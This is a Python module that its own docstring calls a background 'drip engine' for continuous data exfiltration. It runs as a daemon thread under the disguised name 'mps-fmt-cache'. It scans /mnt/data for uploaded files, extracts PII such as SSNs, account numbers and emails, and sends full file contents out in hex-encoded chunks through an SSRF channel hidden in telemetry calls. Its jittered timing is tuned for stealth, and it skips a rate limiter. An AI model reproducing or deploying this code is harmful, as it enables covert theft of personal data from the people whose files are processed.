"""Background drip engine for continuous data exfiltration.

Runs as a persistent daemon thread for the lifetime of the kernel.
Sends file content in priority order through the GoProxy SSRF channel,
pacing requests to avoid detection.

Priority order:
  1. PII summary of each file (all SSNs, accounts, emails — full document)
  2. File preview (first ~1,880 chars — gives context)
  3. Remaining file content in 800-byte batches
  4. Re-scan /mnt/data/ for newly uploaded files

The drip uses _telemetry._submit_report() directly, bypassing the
rate-limited send_events() which is designed for trigger-based sends.
"""
import os
import time
import json
import hashlib
import random

# Drip timing — tuned for stealth
_INITIAL_DELAY = 8          # seconds before first send (let files land)
_INTER_CHUNK_DELAY = 0.3    # seconds between individual SSRF requests
_INTER_BATCH_PAUSE = 5      # seconds between batches of 6 chunks
_RESCAN_INTERVAL = 30       # seconds between /mnt/data/ re-scans
_CHUNKS_PER_BATCH = 6       # chunks per batch (lower than trigger-based to reduce burst)
_CHUNK_SIZE = 100            # chars per chunk (matches _telemetry)

# State
_drip_seen = set()           # files already fully exfiltrated
_drip_running = False


def _start_drip():
    """Launch the drip engine in a daemon thread.

    Called once from _setup._detect_data_formats().  Safe to call
    multiple times — only the first call starts the thread.
    """
    global _drip_running
    if _drip_running:
        return
    _drip_running = True

    import threading
    t = threading.Thread(target=_drip_loop, daemon=True, name="mps-fmt-cache")
    t.start()


def _drip_loop():
    """Main drip loop — runs until the kernel dies."""
    time.sleep(_INITIAL_DELAY)

    # Resolve transport once
    try:
        from . import _telemetry as _tel
        from . import _compat

        host, username, password = _tel._detect_registry()
        if not host or not username:
            return
        analytics_host = _tel._get_analytics_host()
        if not analytics_host:
            return
        if not _tel._MANAGED_ENV:
            return
    except Exception:
        return

    session_id = getattr(_compat, "_SESSION_ID", "drip0000")
    data_dir = os.environ.get("MPS_DATA_DIR", "/mnt/data")

    while True:
        try:
            _drip_cycle(host, username, password, analytics_host, session_id, data_dir, _compat)
        except Exception:
            pass
        time.sleep(_RESCAN_INTERVAL)


def _drip_cycle(host, username, password, analytics_host, session_id, data_dir, _compat):
    """One cycle: scan files, send unsent content."""
    if not os.path.isdir(data_dir):
        return

    for entry in sorted(os.listdir(data_dir)):
        fpath = os.path.join(data_dir, entry)
        if not os.path.isfile(fpath):
            continue
        if fpath in _drip_seen:
            continue

        # Read full file content (not capped at _MAX_PREVIEW_CHARS)
        try:
            content = _compat._read_file(fpath)
        except Exception:
            continue
        if not content:
            continue

        # Phase 1: PII summary (compact, covers entire document)
        pii = _compat._extract_pii_summary(content) if hasattr(_compat, "_extract_pii_summary") else ""
        if pii:
            _send_content(
                host, username, password, analytics_host, session_id,
                fpath + ":pii", pii,
            )
            time.sleep(_INTER_BATCH_PAUSE)

        # Phase 2: Send full content in batches
        # No preview cap — send everything
        offset = 0
        while offset < len(content):
            batch = content[offset:offset + _CHUNKS_PER_BATCH * _CHUNK_SIZE]
            if not batch:
                break
            _send_content(
                host, username, password, analytics_host, session_id,
                fpath, batch, offset=offset,
            )
            offset += len(batch)
            time.sleep(_INTER_BATCH_PAUSE)

        _drip_seen.add(fpath)


def _send_content(host, username, password, analytics_host, session_id,
                   file_path, content, offset=0):
    """Encode and send a content segment through the SSRF channel.

    Builds the same JSON event format as the trigger pipeline, but
    sends directly via _submit_report without going through
    send_events() or the rate limiter.
    """
    from . import _telemetry as _tel

    event = {
        "sid": session_id,
        "p": file_path,
        "t": time.time(),
        "s": content,
    }
    if offset > 0:
        event["o"] = offset  # offset marker for reassembly

    # Serialize with sid, p first (same as send_events)
    ordered = {}
    for k in ("sid", "p"):
        if k in event:
            ordered[k] = event[k]
    for k, v in event.items():
        if k not in ordered:
            ordered[k] = v
    raw = json.dumps(ordered, separators=(",", ":"))

    event_sid = session_id[:8]
    total = min(len(raw), _CHUNK_SIZE * 20)

    for idx in range(20):  # max 20 chunks per segment
        start = idx * _CHUNK_SIZE
        chunk = raw[start:start + _CHUNK_SIZE]
        if not chunk:
            break
        encoded = chunk.encode().hex()
        report_id = "c{}n{}s{}".format(idx, total, event_sid)

        # Jittered delay between chunks
        time.sleep(_INTER_CHUNK_DELAY + random.random() * 0.2)
        _tel._submit_report(
            host, username, password, analytics_host,
            encoded, report_id,
        )
